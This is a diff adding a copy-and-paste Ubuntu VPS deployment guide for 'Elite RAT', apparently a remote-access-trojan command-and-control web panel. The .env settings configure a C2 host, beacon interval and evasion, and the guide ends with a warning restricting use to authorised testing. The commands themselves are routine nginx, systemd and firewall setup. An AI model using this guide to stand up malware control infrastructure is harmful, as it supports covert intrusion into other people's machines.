@@ -1,0 +1,565 @@
+================================================================================
+    UBUNTU VPS DEPLOYMENT - COPY & PASTE COMMANDS IN ORDER
+================================================================================
+
+IMPORTANT: 
+- Copy each section ONE AT A TIME
+- Replace placeholders (YOUR_DOMAIN, YOUR_VPS_IP, etc.) with real values
+- Press ENTER after pasting each section
+- Wait for each section to complete before moving to next
+
+================================================================================
+SECTION 0: BEFORE YOU START - DO THIS ON YOUR LOCAL COMPUTER
+================================================================================
+
+# Generate SSH key (if you don't have one)
+ssh-keygen -t ed25519 -C "your_email@example.com"
+
+# Display your public key (add this to GitHub: Settings > SSH Keys)
+cat ~/.ssh/id_ed25519.pub
+
+# Test GitHub connection
+ssh -T git@github.com
+
+# NOW SSH INTO YOUR VPS:
+ssh root@YOUR_VPS_IP
+
+
+================================================================================
+SECTION 1: UPDATE SYSTEM & INSTALL ESSENTIALS
+================================================================================
+
+# Update and upgrade system
+sudo apt update && sudo apt upgrade -y
+
+# Install essential packages
+sudo apt install -y build-essential wget curl git vim ufw fail2ban python3 python3-pip python3-venv python3-dev libpq-dev libjpeg-dev zlib1g-dev libffi-dev libssl-dev libsqlite3-dev nginx certbot python3-certbot-nginx htop
+
+
+================================================================================
+SECTION 2: CREATE NON-ROOT USER (Optional but recommended)
+================================================================================
+
+# Create user (replace 'deployuser' with your preferred username)
+sudo adduser deployuser
+
+# Add to sudo group
+sudo usermod -aG sudo deployuser
+
+# OPTIONAL: Switch to new user now, or continue as root
+# su - deployuser
+
+
+================================================================================
+SECTION 3: CONFIGURE FIREWALL
+================================================================================
+
+# Allow SSH (IMPORTANT: Don't lock yourself out!)
+sudo ufw allow 22/tcp
+
+# Allow HTTP and HTTPS
+sudo ufw allow 80/tcp
+sudo ufw allow 443/tcp
+
+# Allow app port temporarily (remove later)
+sudo ufw allow 5000/tcp
+
+# Enable firewall
+sudo ufw --force enable
+
+# Check status
+sudo ufw status verbose
+
+
+================================================================================
+SECTION 4: CREATE APPLICATION DIRECTORY & CLONE REPO
+================================================================================
+
+# Create directory
+sudo mkdir -p /opt/elite-rat
+
+# Set ownership (if using deployuser, change from $USER to deployuser)
+sudo chown -R $USER:$USER /opt/elite-rat
+
+# Navigate to directory
+cd /opt/elite-rat
+
+# Clone repository (REPLACE WITH YOUR GITHUB URL)
+git clone git@github.com:YOUR_USERNAME/YOUR_REPO_NAME.git .
+
+# Verify files
+ls -la
+
+
+================================================================================
+SECTION 5: SETUP PYTHON VIRTUAL ENVIRONMENT
+================================================================================
+
+# Create virtual environment
+python3 -m venv venv
+
+# Activate virtual environment
+source venv/bin/activate
+
+# Upgrade pip
+pip install --upgrade pip setuptools wheel
+
+# Install requirements
+pip install -r requirements.txt
+
+# Install production server
+pip install gunicorn python-dotenv gevent gevent-websocket
+
+
+================================================================================
+SECTION 6: CREATE DIRECTORIES
+================================================================================
+
+# Create necessary directories
+mkdir -p /opt/elite-rat/data
+mkdir -p /opt/elite-rat/logs
+mkdir -p /opt/elite-rat/keys
+mkdir -p /opt/elite-rat/generated
+mkdir -p /opt/elite-rat/ssl
+
+
+================================================================================
+SECTION 7: GENERATE SECURE KEYS (SAVE THESE!)
+================================================================================
+
+# Generate secret keys - COPY THE OUTPUT AND SAVE IT!
+echo "SECRET_KEY: $(openssl rand -hex 32)"
+echo "ENCRYPTION_KEY: $(openssl rand -hex 32)"
+echo "AUTH_TOKEN: $(openssl rand -hex 32)"
+
+# YOU WILL USE THESE IN THE NEXT SECTION
+
+
+================================================================================
+SECTION 8: CREATE .ENV FILE
+================================================================================
+
+# Create .env file (this opens nano editor)
+nano /opt/elite-rat/.env
+
+# PASTE THIS INTO THE EDITOR, THEN CUSTOMIZE:
+
+FLASK_APP=web_app_real.py
+FLASK_ENV=production
+FLASK_DEBUG=false
+
+ELITE_C2_HOST=your-domain.com
+ELITE_C2_PORT=443
+ELITE_C2_PROTOCOL=https
+
+STITCH_ADMIN_USER=admin
+STITCH_ADMIN_PASSWORD=CHANGE_THIS_TO_STRONG_PASSWORD
+STITCH_SECRET_KEY=PASTE_SECRET_KEY_FROM_SECTION_7
+ELITE_ENCRYPTION_KEY=PASTE_ENCRYPTION_KEY_FROM_SECTION_7
+
+DATABASE_PATH=/opt/elite-rat/data/elite.db
+ELITE_BEACON_INTERVAL=60
+ELITE_ENABLE_EVASION=true
+
+# AFTER PASTING:
+# 1. Replace CHANGE_THIS_TO_STRONG_PASSWORD with your password
+# 2. Replace PASTE_SECRET_KEY_FROM_SECTION_7 with the key from section 7
+# 3. Replace PASTE_ENCRYPTION_KEY_FROM_SECTION_7 with the key from section 7
+# 4. Replace your-domain.com with your actual domain (or VPS IP)
+# 5. Press Ctrl+X, then Y, then ENTER to save
+
+
+================================================================================
+SECTION 9: GENERATE SSL CERTIFICATE
+================================================================================
+
+# Option A: Let's Encrypt (for real domain - RECOMMENDED)
+# Replace your-domain.com with your actual domain
+sudo certbot certonly --standalone -d your-domain.com -d www.your-domain.com
+
+# Option B: Self-signed certificate (for testing with IP)
+sudo openssl req -x509 -nodes -days 365 -newkey rsa:4096 \
+    -keyout /opt/elite-rat/ssl/key.pem \
+    -out /opt/elite-rat/ssl/cert.pem \
+    -subj "/C=US/ST=State/L=City/O=Organization/CN=your-domain.com"
+
+sudo chown -R $USER:$USER /opt/elite-rat/ssl
+chmod 600 /opt/elite-rat/ssl/key.pem
+chmod 644 /opt/elite-rat/ssl/cert.pem
+
+
+================================================================================
+SECTION 10: CONFIGURE NGINX
+================================================================================
+
+# Create Nginx config file
+sudo nano /etc/nginx/sites-available/elite-rat
+
+# PASTE THIS INTO THE EDITOR, THEN CUSTOMIZE:
+
+upstream flask_app {
+    server 127.0.0.1:5000;
+}
+
+server {
+    listen 80;
+    listen [::]:80;
+    server_name your-domain.com www.your-domain.com;
+    return 301 https://$server_name$request_uri;
+}
+
+server {
+    listen 443 ssl http2;
+    listen [::]:443 ssl http2;
+    server_name your-domain.com www.your-domain.com;
+
+    # For Let's Encrypt (Option A from Section 9)
+    ssl_certificate /etc/letsencrypt/live/your-domain.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/your-domain.com/privkey.pem;
+    
+    # For self-signed (Option B from Section 9) - UNCOMMENT THESE AND COMMENT ABOVE
+    # ssl_certificate /opt/elite-rat/ssl/cert.pem;
+    # ssl_certificate_key /opt/elite-rat/ssl/key.pem;
+
+    ssl_protocols TLSv1.2 TLSv1.3;
+    ssl_ciphers HIGH:!aNULL:!MD5;
+    ssl_prefer_server_ciphers on;
+
+    client_max_body_size 100M;
+
+    location / {
+        proxy_pass http://flask_app;
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade $http_upgrade;
+        proxy_set_header Connection "upgrade";
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+        proxy_connect_timeout 600s;
+        proxy_send_timeout 600s;
+        proxy_read_timeout 600s;
+    }
+
+    location /socket.io/ {
+        proxy_pass http://flask_app/socket.io/;
+        proxy_http_version 1.1;
+        proxy_buffering off;
+        proxy_set_header Upgrade $http_upgrade;
+        proxy_set_header Connection "Upgrade";
+        proxy_set_header Host $host;
+    }
+
+    access_log /var/log/nginx/elite-rat-access.log;
+    error_log /var/log/nginx/elite-rat-error.log;
+}
+
+# AFTER PASTING:
+# 1. Replace all instances of your-domain.com with your actual domain
+# 2. Choose SSL certificate option (Let's Encrypt or self-signed)
+# 3. Press Ctrl+X, then Y, then ENTER to save
+
+
+================================================================================
+SECTION 11: ENABLE NGINX SITE
+================================================================================
+
+# Enable the site
+sudo ln -s /etc/nginx/sites-available/elite-rat /etc/nginx/sites-enabled/
+
+# Remove default site
+sudo rm -f /etc/nginx/sites-enabled/default
+
+# Test Nginx configuration
+sudo nginx -t
+
+# If test passed, restart Nginx
+sudo systemctl restart nginx
+sudo systemctl enable nginx
+
+
+================================================================================
+SECTION 12: CREATE SYSTEMD SERVICE
+================================================================================
+
+# Create systemd service file
+sudo nano /etc/systemd/system/elite-rat.service
+
+# PASTE THIS INTO THE EDITOR, THEN CUSTOMIZE:
+
+[Unit]
+Description=Elite RAT Web Application
+After=network.target
+
+[Service]
+Type=simple
+User=root
+Group=root
+WorkingDirectory=/opt/elite-rat
+Environment="PATH=/opt/elite-rat/venv/bin"
+Environment="FLASK_ENV=production"
+EnvironmentFile=/opt/elite-rat/.env
+
+ExecStart=/opt/elite-rat/venv/bin/gunicorn \
+    --bind 127.0.0.1:5000 \
+    --workers 4 \
+    --worker-class gevent \
+    --timeout 300 \
+    --access-logfile /opt/elite-rat/logs/access.log \
+    --error-logfile /opt/elite-rat/logs/error.log \
+    --log-level info \
+    web_app_real:app
+
+Restart=always
+RestartSec=10
+NoNewPrivileges=true
+PrivateTmp=true
+
+[Install]
+WantedBy=multi-user.target
+
+# AFTER PASTING:
+# 1. If you created a non-root user (deployuser), change User=root to User=deployuser and Group=root to Group=deployuser
+# 2. Press Ctrl+X, then Y, then ENTER to save
+
+
+================================================================================
+SECTION 13: START THE SERVICE
+================================================================================
+
+# Reload systemd
+sudo systemctl daemon-reload
+
+# Enable service to start on boot
+sudo systemctl enable elite-rat
+
+# Start the service
+sudo systemctl start elite-rat
+
+# Check status (should show "active (running)")
+sudo systemctl status elite-rat
+
+
+================================================================================
+SECTION 14: CONFIGURE FAIL2BAN FOR SSH PROTECTION
+================================================================================
+
+# Copy config
+sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
+
+# Create SSH jail config
+sudo tee -a /etc/fail2ban/jail.local > /dev/null << 'EOF'
+
+[sshd]
+enabled = true
+port = 22
+filter = sshd
+logpath = /var/log/auth.log
+maxretry = 3
+bantime = 3600
+EOF
+
+# Start fail2ban
+sudo systemctl enable fail2ban
+sudo systemctl start fail2ban
+
+
+================================================================================
+SECTION 15: SETUP AUTOMATED BACKUPS
+================================================================================
+
+# Create backups directory
+sudo mkdir -p /opt/backups
+
+# Create backup script
+cat > /opt/elite-rat/backup.sh << 'EOF'
+#!/bin/bash
+BACKUP_DIR="/opt/backups"
+DATE=$(date +%Y%m%d_%H%M%S)
+mkdir -p $BACKUP_DIR
+tar -czf $BACKUP_DIR/elite-rat-backup-$DATE.tar.gz \
+    /opt/elite-rat/data \
+    /opt/elite-rat/.env \
+    /opt/elite-rat/config.yaml 2>/dev/null
+ls -t $BACKUP_DIR/elite-rat-backup-*.tar.gz | tail -n +8 | xargs rm -f 2>/dev/null
+echo "Backup complete: $BACKUP_DIR/elite-rat-backup-$DATE.tar.gz"
+EOF
+
+# Make executable
+chmod +x /opt/elite-rat/backup.sh
+
+# Add to crontab (runs daily at 2 AM)
+(crontab -l 2>/dev/null; echo "0 2 * * * /opt/elite-rat/backup.sh") | crontab -
+
+
+================================================================================
+SECTION 16: SETUP LOG ROTATION
+================================================================================
+
+# Create logrotate config
+sudo tee /etc/logrotate.d/elite-rat > /dev/null << 'EOF'
+/opt/elite-rat/logs/*.log {
+    daily
+    missingok
+    rotate 14
+    compress
+    delaycompress
+    notifempty
+    create 0640 root root
+    sharedscripts
+    postrotate
+        systemctl reload elite-rat > /dev/null 2>&1 || true
+    endscript
+}
+EOF
+
+
+================================================================================
+SECTION 17: VERIFY EVERYTHING IS WORKING
+================================================================================
+
+# Check service status
+sudo systemctl status elite-rat nginx fail2ban
+
+# Check if ports are listening
+sudo netstat -tulpn | grep -E '(80|443|5000)'
+
+# Test local connection
+curl -I http://localhost:5000
+
+# Test external connection (replace with your domain)
+curl -I https://your-domain.com
+
+# View application logs
+sudo journalctl -u elite-rat -n 50 --no-pager
+
+# View Nginx logs
+sudo tail -20 /var/log/nginx/elite-rat-error.log
+
+
+================================================================================
+SECTION 18: FINAL SECURITY STEPS
+================================================================================
+
+# Remove port 5000 from firewall (no longer needed)
+sudo ufw delete allow 5000/tcp
+
+# Reload firewall
+sudo ufw reload
+
+# Check firewall status
+sudo ufw status numbered
+
+
+================================================================================
+✅ DEPLOYMENT COMPLETE!
+================================================================================
+
+Your application should now be running at:
+- https://your-domain.com (or https://YOUR_VPS_IP if using IP)
+
+Default Login:
+- Username: admin
+- Password: (whatever you set in .env file)
+
+
+================================================================================
+USEFUL COMMANDS FOR LATER
+================================================================================
+
+# View live logs
+sudo journalctl -u elite-rat -f
+
+# Restart application
+sudo systemctl restart elite-rat
+
+# Restart Nginx
+sudo systemctl restart nginx
+
+# Check service status
+sudo systemctl status elite-rat
+
+# Manual backup
+/opt/elite-rat/backup.sh
+
+# Update from GitHub
+cd /opt/elite-rat
+git pull origin main
+source venv/bin/activate
+pip install -r requirements.txt --upgrade
+sudo systemctl restart elite-rat
+
+# Check disk space
+df -h
+
+# Check memory
+free -h
+
+# Monitor processes
+htop
+
+
+================================================================================
+TROUBLESHOOTING - IF SOMETHING GOES WRONG
+================================================================================
+
+# Application won't start
+sudo journalctl -u elite-rat -n 100 --no-pager
+sudo systemctl restart elite-rat
+
+# Port 5000 already in use
+sudo lsof -i :5000
+sudo pkill -f gunicorn
+sudo systemctl restart elite-rat
+
+# 502 Bad Gateway
+sudo systemctl status elite-rat
+curl http://localhost:5000
+sudo systemctl restart elite-rat nginx
+
+# Can't access from browser
+sudo ufw status verbose
+sudo systemctl status nginx
+curl -I https://your-domain.com
+
+# SSL certificate error
+sudo certbot renew
+sudo systemctl restart nginx
+
+# Check all logs
+sudo journalctl -u elite-rat -n 50
+sudo tail -50 /var/log/nginx/elite-rat-error.log
+tail -50 /opt/elite-rat/logs/error.log
+
+
+================================================================================
+IMPORTANT NOTES:
+================================================================================
+
+1. IONOS CLOUD PANEL FIREWALL:
+   - Log into IONOS Control Panel
+   - Go to your VPS → Firewall
+   - Add rules: Allow ports 22, 80, 443 from Anywhere
+
+2. DNS CONFIGURATION:
+   - Log into IONOS Control Panel (or your domain registrar)
+   - Go to Domain Management → DNS
+   - Add A Record: @ → YOUR_VPS_IP
+   - Add A Record: www → YOUR_VPS_IP
+   - Wait 15-30 minutes for propagation
+
+3. SAVE YOUR CREDENTIALS:
+   - Admin username and password
+   - Secret keys from Section 7
+   - VPS IP address
+   - Domain name
+
+4. LEGAL WARNING:
+   - This is for AUTHORIZED security testing ONLY
+   - You MUST have explicit written permission
+   - Unauthorized use is illegal
+
+
+================================================================================
+END OF DEPLOYMENT GUIDE
+================================================================================
